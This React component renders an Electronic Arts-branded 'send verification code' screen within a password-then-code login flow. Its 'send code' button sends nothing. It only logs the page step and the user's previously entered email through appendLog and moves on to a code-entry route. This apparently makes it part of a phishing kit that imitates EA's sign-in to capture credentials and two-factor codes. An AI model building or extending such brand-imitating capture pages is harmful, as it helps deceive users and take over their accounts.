import React from 'react'
import { useNavigate } from 'react-router-dom'
import { ArrowLeft } from 'lucide-react'
import EALogo from './EALogo'
import { appendLog, getLastEmail } from '../utils/logger'
import { maskEmail } from '../utils/emailMask'

const VerificationCodeScreen: React.FC = () => {
  const navigate = useNavigate()

  const handleBack = () => {
    navigate('/password')
  }

  const handleSendCode = () => {
    console.log('Send code clicked')
    // Log that we moved to verification step
    appendLog({ page: 'verify', email: getLastEmail() || undefined })
    navigate('/code')
  }

  return (
    <div className="max-w-[36rem] mx-auto bg-transparent min-h-screen relative">
      {/* Header with Back Button */}
      <div className="px-6 pt-12">
        <button
          onClick={handleBack}
          className="flex items-center space-x-2 text-white bg-slate-700 hover:bg-slate-600 px-4 py-2 rounded-lg transition-colors"
        >
          <ArrowLeft size={20} />
          <span className="font-medium tracking-wider">BACK</span>
        </button>
      </div>

      {/* Main Content */}
      <div className="px-6 pt-8">
        {/* EA Logo */}
        <div className="w-full flex justify-center mb-12">
          <EALogo />
        </div>

        {/* Message */}
        <div className="text-center mb-12">
          <p className="text-gray-300 text-lg">
            {(() => {
              const masked = maskEmail(getLastEmail())
              return masked
                ? `we'll send a verification code to ${masked}`
                : "we'll send a verification code to your email"
            })()}
          </p>
        </div>

        {/* Send Code Button */}
        <button
          onClick={handleSendCode}
          className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-4 rounded-xl transition-colors text-lg tracking-wider"
        >
          send code
        </button>
      </div>
    </div>
  )
}

export default VerificationCodeScreen
